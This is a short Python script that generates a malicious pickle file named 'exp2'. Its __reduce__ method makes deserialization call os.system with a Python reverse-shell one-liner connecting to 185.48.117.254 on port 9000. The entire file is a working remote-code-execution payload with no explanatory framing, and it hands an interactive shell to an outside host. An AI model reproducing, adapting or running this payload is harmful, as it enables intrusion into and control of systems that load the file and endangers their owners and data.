import pickle
import os


class RCE:
    def __reduce__(self):
        cmd = "export RHOST=\"185.48.117.254\";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
        return os.system, (cmd,)


with open("exp2", 'wb') as f:
    pickle.dump(RCE(), f)